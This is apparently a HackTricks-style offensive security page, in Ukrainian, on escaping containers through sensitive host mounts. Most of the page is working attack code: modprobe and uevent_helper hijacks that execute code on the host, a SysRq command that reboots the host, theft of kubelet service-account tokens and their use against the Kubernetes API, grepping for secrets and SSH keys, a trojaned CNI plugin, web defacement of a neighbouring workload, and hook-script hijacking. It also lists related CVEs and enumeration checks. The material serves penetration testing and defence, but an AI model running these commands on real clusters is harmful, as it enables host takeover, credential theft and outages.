# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Монтування хоста є однією з найважливіших практичних поверхонь для container escape, оскільки вони часто зводять нанівець ретельно ізольоване представлення процесів, знову надаючи прямий доступ до ресурсів хоста. Небезпечні випадки не обмежуються `/`. Bind mounts для `/proc`, `/sys`, `/var`, runtime sockets, стану, яким керує kubelet, або шляхів, пов’язаних із пристроями, можуть розкрити елементи керування kernel, credentials, файлові системи сусідніх контейнерів і management interfaces runtime.

Ця сторінка існує окремо від окремих сторінок про захист, оскільки модель зловживання є наскрізною. Writable host mount є небезпечним частково через mount namespaces, частково через user namespaces, частково через покриття AppArmor або SELinux, а також через те, який саме шлях хоста було exposed. Розгляд цієї теми окремо значно спрощує аналіз attack surface.

## Exposure `/proc`

procfs містить як звичайну інформацію про процеси, так і high-impact kernel control interfaces. Тому bind mount на кшталт `-v /proc:/host/proc` або view контейнера, що відкриває неочікувані writable proc entries, може призвести до розкриття інформації, denial of service або прямого виконання коду на хості.

Важливі procfs paths включають:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Зловживання

Спочатку перевірте, які high-value procfs entries доступні для перегляду або запису:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ці шляхи цікаві з різних причин. `core_pattern`, `modprobe` і `binfmt_misc` можуть стати шляхами до виконання коду на хості, якщо доступні для запису. `kallsyms`, `kmsg`, `kcore` і `config.gz` є потужними джерелами розвідданих для kernel exploitation. `sched_debug` і `mountinfo` розкривають контекст процесів, cgroup і файлової системи, що може допомогти відтворити структуру хоста зсередини контейнера.

Практична цінність кожного шляху відрізняється, і розглядати їх так, ніби всі вони мають однаковий вплив, ускладнює triage:

- `/proc/sys/kernel/core_pattern`
Якщо доступний для запису, це один із найнебезпечніших шляхів procfs, оскільки kernel виконає pipe handler після збою. Контейнер, який може вказати `core_pattern` на payload, що зберігається в його overlay або у змонтованому шляху хоста, часто може отримати виконання коду на хості. Див. також [read-only-paths.md](protections/read-only-paths.md) для окремого прикладу.
- `/proc/sys/kernel/modprobe`
Цей шлях керує userspace helper, який використовує kernel, коли потрібно викликати логіку завантаження модулів. Якщо він доступний для запису з контейнера та обробляється в контексті хоста, то може стати ще одним primitive для виконання коду на хості. Особливо цікавим він стає в поєднанні зі способом активувати цей helper path.
- `/proc/sys/vm/panic_on_oom`
Зазвичай це не є прямим escape primitive, але він може перетворити memory pressure на відмову в обслуговуванні всього хоста, перетворюючи умови OOM на поведінку kernel panic.
- `/proc/sys/fs/binfmt_misc`
Якщо інтерфейс реєстрації доступний для запису, attacker може зареєструвати handler для вибраного magic value і отримати виконання в контексті хоста під час запуску відповідного файлу.
- `/proc/config.gz`
Корисний для triage kernel exploit. Допомагає визначити, які підсистеми, mitigations і додаткові функції kernel увімкнені, без доступу до metadata пакетів хоста.
- `/proc/sysrq-trigger`
Переважно це шлях до denial-of-service, але дуже серйозний. Він може негайно перезавантажити хост, викликати panic або іншим чином порушити його роботу.
- `/proc/kmsg`
Розкриває повідомлення ring buffer kernel. Корисний для fingerprinting хоста, аналізу збоїв і, у деяких середовищах, для leak інформації, яка може допомогти під час kernel exploitation.
- `/proc/kallsyms`
Цінний, якщо доступний для читання, оскільки розкриває інформацію про експортовані символи kernel і може допомогти обійти припущення щодо address randomization під час розробки kernel exploit.
- `/proc/[pid]/mem`
Це прямий інтерфейс до пам’яті процесу. Якщо цільовий процес доступний за необхідних умов у стилі ptrace, він може дозволити читати або змінювати пам’ять іншого процесу. Реальний вплив значною мірою залежить від credentials, `hidepid`, Yama та обмежень ptrace, тому це потужний, але умовний шлях.
- `/proc/kcore`
Надає view системної пам’яті у стилі core image. Файл величезний і незручний у використанні, але якщо він дійсно доступний для читання, це свідчить про небезпечно відкриту поверхню пам’яті хоста.
- `/proc/kmem` і `/proc/mem`
Історично це raw memory interfaces із високим впливом. У багатьох сучасних системах вони вимкнені або жорстко обмежені, але якщо вони присутні та доступні для використання, їх слід розглядати як критичні findings.
- `/proc/sched_debug`
Leak інформацію про планування та завдання, яка може розкрити ідентичність процесів хоста, навіть коли інші view процесів виглядають чистішими, ніж очікувалося.
- `/proc/[pid]/mountinfo`
Надзвичайно корисний для відтворення того, де контейнер насправді розташований на хості, які шляхи підтримуються overlay і чи відповідає writable mount вмісту хоста, або лише шару контейнера.

Якщо `/proc/[pid]/mountinfo` або overlay details доступні для читання, використайте їх, щоб відновити шлях хоста до файлової системи контейнера:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ці команди корисні, оскільки низка прийомів виконання на host вимагає перетворення шляху всередині container на відповідний шлях з точки зору host.

### Повний приклад: зловживання шляхом helper `modprobe`

Якщо `/proc/sys/kernel/modprobe` доступний для запису з container, а шлях до helper інтерпретується в контексті host, його можна перенаправити на payload, контрольований attacker:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Точний тригер залежить від цілі та поведінки kernel, але важливо те, що шлях до writable helper може перенаправити майбутній виклик kernel helper на вміст host path, контрольований attacker.

### Повний приклад: розвідка kernel за допомогою `kallsyms`, `kmsg` і `config.gz`

Якщо метою є оцінка exploitability, а не негайний escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ці команди допомагають визначити, чи доступна корисна інформація про символи, чи розкривають нещодавні повідомлення kernel цікавий стан, а також які функції kernel або mitigation скомпільовано. Вплив зазвичай не полягає в безпосередньому escape, але це може суттєво скоротити час triage kernel-уразливості.

### Повний приклад: перезавантаження host через SysRq

Якщо `/proc/sysrq-trigger` доступний для запису та відкриває view host:
```bash
echo b > /proc/sysrq-trigger
```
Ефектом є негайне перезавантаження host. Це не тонкий приклад, але він чітко демонструє, що exposure procfs може бути набагато серйознішим за disclosure інформації.

## Exposure `/sys`

sysfs розкриває великі обсяги даних про стан kernel і пристроїв. Деякі шляхи sysfs переважно корисні для fingerprinting, тоді як інші можуть впливати на виконання helper, поведінку пристроїв, конфігурацію security-module або стан firmware.

До sysfs-шляхів із високою цінністю належать:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ці шляхи важливі з різних причин. `/sys/class/thermal` може впливати на поведінку керування температурою, а отже й на стабільність host у середовищах із неналежним exposure. `/sys/kernel/vmcoreinfo` може leak інформацію про crash-dump і структуру kernel, що допомагає під час low-level fingerprinting host. `/sys/kernel/security` є інтерфейсом `securityfs`, який використовують Linux Security Modules, тому неочікуваний доступ до нього може розкрити або змінити стан, пов’язаний із MAC. Шляхи змінних EFI можуть впливати на boot settings, що зберігаються у firmware, і тому є значно небезпечнішими за звичайні configuration files. `debugfs` у `/sys/kernel/debug` особливо небезпечний, оскільки це навмисно developer-oriented інтерфейс із набагато меншою кількістю вимог безпеки, ніж hardened kernel API, призначені для production.

Корисні команди для перевірки цих шляхів:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Що робить ці команди цікавими:

- `/sys/kernel/security` може показати, чи доступна поверхня AppArmor, SELinux або іншого LSM у спосіб, який мав залишатися доступним лише хосту.
- `/sys/kernel/debug` часто є найбільш тривожним результатом у цій групі. Якщо `debugfs` змонтовано та він доступний для читання або запису, очікуйте широку поверхню взаємодії з kernel, точний ризик якої залежить від увімкнених debug-вузлів.
- Доступ до EFI-змінних трапляється рідше, але має високий вплив, оскільки стосується налаштувань, пов’язаних із firmware, а не звичайних runtime-файлів.
- `/sys/class/thermal` переважно має значення для стабільності хоста та взаємодії з hardware, а не для акуратного shell-style escape.
- `/sys/kernel/vmcoreinfo` переважно є джерелом інформації для fingerprinting хоста й аналізу crash, корисним для розуміння низькорівневого стану kernel.

### Повний приклад: `uevent_helper`

Якщо `/sys/kernel/uevent_helper` доступний для запису, kernel може виконати helper, контрольований attacker, коли буде triggered `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Причина, чому це працює, полягає в тому, що шлях до helper інтерпретується з точки зору host. Після запуску helper виконується в контексті host, а не всередині поточного container.

## Відкриття `/var`

Монтування `/var` host у container часто недооцінюють, оскільки воно не виглядає таким драматичним, як монтування `/`. На практиці цього може бути достатньо для доступу до runtime-сокетів, директорій snapshot контейнерів, томів pod, якими керує kubelet, projected service-account tokens і файлових систем сусідніх застосунків. На сучасних nodes саме в `/var` часто фактично зберігається найцікавіший з операційного погляду стан container.

### Приклад Kubernetes

Pod із `hostPath: /var` часто може читати projected tokens інших pod і вміст overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ці команди корисні, оскільки вони показують, чи відкриває mount лише неважливі дані застосунку, чи credentials кластера з високим рівнем впливу. Readable service-account token може одразу перетворити локальне виконання коду на доступ до Kubernetes API.

Якщо token присутній, перевірте, до чого саме він надає доступ, замість того щоб зупинятися на виявленні token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Вплив тут може бути значно більшим, ніж доступ до локального node. Token із широкими правами RBAC може перетворити змонтований `/var` на компрометацію всього кластера.

### Приклад Docker і containerd

На Docker hosts відповідні дані часто розташовані в `/var/lib/docker`, тоді як на Kubernetes nodes із containerd вони можуть знаходитися в `/var/lib/containerd` або у шляхах, специфічних для snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Якщо змонтований `/var` відкриває доступ на запис до вмісту snapshot іншого workload, attacker може змінювати файли application, розміщувати web-контент або змінювати startup-скрипти, не торкаючись конфігурації поточного container.

Конкретні способи зловживання після виявлення доступного на запис вмісту snapshot:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ці команди корисні, оскільки показують три основні категорії впливу змонтованого `/var`: втручання в застосунки, відновлення секретів і lateral movement до сусідніх workloads.

## Стани Kubelet, плагіни та шляхи CNI

Монтування `/var/lib/kubelet`, `/opt/cni/bin` або `/etc/cni/net.d` часто відкривається через привілейовані DaemonSets, CNI-агенти, CSI node plugins, GPU operators і storage helpers. Такі монтування легко відкинути як "node plumbing", але вони безпосередньо задіяні в execution path для нових pod'ів і часто містять облікові дані kubelet, projected secrets, registration sockets і виконувані host-side plugin binaries.

До цілей із високою цінністю належать:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Корисні команди для перевірки:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Чому ці шляхи важливі:

- `/var/lib/kubelet/pki` може розкрити client certificates kubelet та інші node-local credentials, які іноді можна повторно використати проти API server або TLS endpoints, доступних kubelet, залежно від дизайну cluster.
- `/var/lib/kubelet/pods` часто містить projected service-account tokens і змонтовані Secrets сусідніх pods на тому самому node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` переважно є поверхнею для reconnaissance, але дуже корисною: вона показує, які pods і containers наразі володіють GPUs, hugepages, SR-IOV devices та іншими дефіцитними node-local resources.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` і `/var/lib/kubelet/plugins_registry` показують, які CSI, DRA та device plugins встановлено, а також з якими sockets, як очікується, взаємодіятиме kubelet. Якщо ці directories доступні для запису, а не лише для читання, finding стає значно серйознішим.
- `/opt/cni/bin` і `/etc/cni/net.d` безпосередньо беруть участь у налаштуванні pod-network. Доступ для запису туди часто є відкладеним primitive для host-execution, а не просто exposure конфігурації.

### Повний приклад: Writable `/opt/cni/bin`

Якщо host CNI binary directory змонтовано в режимі read-write, заміни plugin може бути достатньо для отримання host execution наступного разу, коли kubelet створить pod sandbox на цьому node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Це не настільки безпосередньо, як змонтований `docker.sock`, але часто це більш реалістичний сценарій у скомпрометованих Kubernetes infrastructure pods. Важливо, що змінений бінарний файл згодом виконується в процесі налаштування мережі хоста, а не поточним контейнером.


## Runtime Sockets

Чутливі монтування хоста часто містять runtime sockets, а не цілі каталоги. Вони настільки важливі, що заслуговують на окреме повторне нагадування тут:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Див. [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) для повних сценаріїв експлуатації після монтування одного з цих сокетів.

Як швидкий шаблон першої взаємодії:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Якщо один із цих варіантів спрацьовує, шлях від "mounted socket" до "start a more privileged sibling container" зазвичай значно коротший, ніж будь-який шлях до kernel breakout.

## Writable Host Path Task Hijack

Writable host mount не обов’язково має відкривати доступ до `/`, щоб бути небезпечним. Якщо змонтований шлях містить скрипти, конфігураційні файли, hooks, plugins або файли, які згодом використовуються host-side scheduled task чи service, container може змінити те, що виконує host.

Загальний порядок перевірки:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Якщо файл із правом запису використовується процесом хоста, під час тестування тримайте payload простим і таким, за яким легко спостерігати:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Цікава частина полягає в межі довіри: запис виконується зсередини контейнера, але виконання відбувається пізніше в контексті host service. Це перетворює вузький hostPath або bind mount на primitive для відкладеного виконання коду на host.

## CVE, пов’язані з монтуванням

Host mounts також перетинаються з уразливостями runtime. Серед важливих нещодавніх прикладів:

- `CVE-2024-21626` у `runc`, де витік дескриптора файлу каталогу міг розмістити робочий каталог у файловій системі host.
- `CVE-2024-23651`, `CVE-2024-23652` і `CVE-2024-23653` у BuildKit, де шкідливі Dockerfiles, frontends і потоки `RUN --mount` могли повторно надати доступ до файлів host, дозволити їх видалення або підвищити привілеї під час build.
- `CVE-2024-1753` у Buildah і потоках build у Podman, де спеціально сформовані bind mounts під час build могли відкрити `/` для читання й запису.
- `CVE-2025-47290` у `containerd` 2.1.0, де TOCTOU під час розпакування image міг дозволити спеціально сформованому image змінити файлову систему host під час pull.

Ці CVE важливі тут, оскільки показують, що обробка mount пов’язана не лише з конфігурацією оператора. Сам runtime також може створювати умови для escape через mount.

## Перевірки

Використовуйте ці команди, щоб швидко знайти mount exposures із найвищою цінністю:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Що тут цікавого:

- Корінь хоста, `/proc`, `/sys`, `/var` і runtime-сокети — усе це знахідки з високим пріоритетом.
- Записи `/proc` і `/sys` із правом запису часто означають, що mount відкриває глобальні для хоста елементи керування kernel, а не безпечне представлення контейнера.
- Шляхи `/var`, змонтовані в контейнер, потребують перевірки облікових даних і сусідніх workload, а не лише аналізу файлової системи.
- Каталоги стану Kubelet і шляхи CNI/plugin мають такий самий пріоритет, як і runtime-сокети, оскільки часто безпосередньо пов’язані зі шляхом створення pod і розповсюдження облікових даних на node.

## References

- [Локальні файли та шляхи, які використовує Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [Контейнер cilium-agent може отримати доступ до хоста через mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
